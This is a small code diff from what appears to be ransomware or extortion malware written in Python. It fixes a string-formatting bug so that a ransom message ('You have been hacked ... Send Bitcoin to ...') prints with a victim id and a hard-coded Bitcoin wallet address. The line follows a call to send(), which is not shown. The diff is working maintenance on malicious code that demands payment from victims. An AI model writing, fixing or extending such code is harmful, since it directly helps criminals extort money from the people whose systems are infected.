@@ -87,7 +87,7 @@ def main():
 
     send()
     print(
-        """You have been hacked (%s) Send Bitcoin to $s""" % uid , "bc1qn2xl6e2n227nrxv54gnvg55pvmq43pkplgckh7"
+        """You have been hacked (%s) Send Bitcoin to %s""" % (uid , "bc1qn2xl6e2n227nrxv54gnvg55pvmq43pkplgckh7")
     )
 
 
